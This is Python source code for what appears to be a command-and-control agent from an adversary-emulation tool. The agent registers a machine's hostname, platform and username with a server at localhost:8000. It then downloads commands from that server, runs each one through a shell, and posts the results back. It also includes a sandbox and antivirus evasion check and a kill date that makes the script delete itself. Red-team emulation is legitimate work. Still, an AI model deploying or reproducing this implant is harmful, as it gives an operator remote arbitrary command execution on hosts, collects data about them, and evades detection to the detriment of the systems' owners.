import configparser
import datetime
from getpass import getuser
import os
import platform
import subprocess
import time
import urllib3
from random import randrange
from pathlib import Path

http = urllib3.PoolManager()
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                         ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
TIMEOUT = 15
executed = []
agent_id = 0
kill_date_string = ''
THIS_DIR = Path(__file__).parent


def config_file():
    config = configparser.ConfigParser()
    global agent_id

    # When operator sets a kill date, kill_date_string will not be 'None'
    # None was converted to a string
    if kill_date_string != 'None':

        new_kill_date = datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M:%S')
        config.read('config.ini')
        if 'kill_date' in config['AGENT']:

            # Check if current kill date is different from the one stored so that we change it
            if config['AGENT']['kill_date'] != kill_date_string:
                print('[+] New Agent Kill Date')
                print('[+] %s' % kill_date_string)
                config['AGENT'] = {'id': agent_id,
                                   'kill_date': new_kill_date}
                with open('config.ini', 'w') as configfile:
                    config.write(configfile)
        else:
            config['AGENT'] = {'id': agent_id,
                               'kill_date': new_kill_date}
            with open('config.ini', 'w') as configfile:
                config.write(configfile)

    # First time to run
    if not os.path.exists(path=THIS_DIR / 'config.ini'):
        config['AGENT'] = {'id': agent_id}
        with open('config.ini', 'w') as configfile:
            config.write(configfile)

    # Other runs
    else:
        if 'kill_date' in config['AGENT']:
            confirm_kill()


def execute_command(command_issued):
    cmd = subprocess.Popen(command_issued, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    executed.append(datetime.datetime.now())
    try:
        success, error = cmd.communicate(timeout=TIMEOUT)
    except subprocess.TimeoutExpired:
        cmd.kill()
        success, error = cmd.communicate()

    success = success.decode("utf-8")
    error = error.decode("utf-8")

    if error is not '':
        return 'Error--' + error

    if success == '' or success != '':
        return 'Success--' + success


def get_platform():
    # We need to handle the platform a bit differently in certain cases.
    # Otherwise, we simply return the value that's given here.
    plat = platform.system().lower()

    if plat == "darwin":
        # 'macos' is the term that is being used within the .yaml files.
        plat = "macos"

    return plat


def register():
    url = 'http://localhost:8000/register_agent'
    req = http.request('POST', url, fields={'id': agent_id, 'hostname': platform.node(), 'platform': get_platform(),
                                            'plat_version': platform.version(), 'username': getuser()}, headers=headers)
    response = str(req.data.decode('utf-8'))
    print('Response code: ' + str(req.status))
    print('[+] ' + response)


def get_techniques():
    url = ('http://localhost:8000/agent_techniques/%s' % agent_id)
    req = http.request('GET', url, headers=headers)
    response = str(req.data.decode('utf-8'))
    # print('Response code: ' + str(req.status))
    # print('Response: ' + response)
    response = response.split(',')
    result = []

    for res in response:
        if res is not '':
            result.append(res)
    # print(response)
    # print(result)
    return result


def download_and_run_commands():
    results = []

    url = ('http://localhost:8000/agent_tasks/%s' % agent_id)

    req = http.request('GET', url, headers=headers)
    response = str(req.data.decode('utf-8'))
    response_code = req.status
    # print('Response code: ' + str(req.status))
    # print('Response: ' + response)

    if response_code == 200:
        # Separates technique's commands into a list separated by ++
        agent_commands = response.split(';')

        for i, command in enumerate(agent_commands):
            if command is '':
                continue
            if i == 0:
                global kill_date_string
                kill_date_string = command
                continue

            results.append(execute_command(command))

    return results


def send_output():
    std_out = download_and_run_commands()
    # url = 'http://localhost:8000/agent_tasks/5'
    agent_tech = get_techniques()
    # http://localhost:8000/agent_techniques/5
    url = 'http://localhost:8000/agent_output'

    # Iterates over list of techniques assigned to an agent_tasks while selecting the respective result or output after
    # executing that technique
    for i, res in enumerate(agent_tech):
        # try:
        # time.sleep(1)
        req = http.request('POST', url, fields={'id': agent_id, 'tech': agent_tech[i], 'output': std_out[i],
                                                'executed': ('%s' % executed[i])}, headers=headers)
        print('Response code: ' + str(req.status))
        # time.sleep(4)
        # except IndexError:
        #     print('Index error')

    # print(results)
    # print(techs)
    # response = str(req.data.decode('utf-8'))
    # print('Response code: ' + str(req.status))
    # print('Response: ' + response)


def store_kill_date():
    config = configparser.ConfigParser()

    if os.path.exists(path=THIS_DIR / 'config.ini'):
        config.read('config.ini')
        config['AGENT']['kill_date'] = datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M')
        with open('config.ini', 'a') as configfile:
            config.write(configfile)


def confirm_kill():
    check = configparser.ConfigParser()
    check.read('config.ini')

    kill_date = check['AGENT']['kill_date']

    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if now > kill_date:
        path = Path(__file__)
        os.remove(path)


# def form():
#     url = 'http://localhost:8000/campaign_delete'
#
#     req = http.request('POST', url, fields={'id': 6}, headers=headers)
#     response = str(req.data.decode('utf-8'))
#     print('Response code: ' + str(req.status))
#     print('Response: ' + response)

def sandbox_evasion():
    # SANDBOX 1 :Check number of CPU core
    if os.cpu_count() >= 2:

        # Get the current time
        now = datetime.datetime.now()

        # Stop code execution for 1 seconds
        time.sleep(1)

        # Get the time after 2 seconds
        now2 = datetime.datetime.now()

        # SANDBOX 2 :Check if AV skipped sleep function
        if (now2 - now) > datetime.timedelta(seconds=1):
            print('Run')
        else:
            print('Sandbox')


if __name__ == '__main__':
    print('Agent running')
    sandbox_evasion()

    # Getting agent id
    if not os.path.exists(path=THIS_DIR / 'config.ini'):
        agent_id = randrange(500)
    else:
        agent_config = configparser.ConfigParser()
        agent_config.read('config.ini')
        agent_id = agent_config['AGENT']['id']
    # print(agent_id)
    # techs = get_techniques()
    # print(techs)
    # results = download_and_run_commands()
    # print(results)
    register()
    send_output()
    config_file()
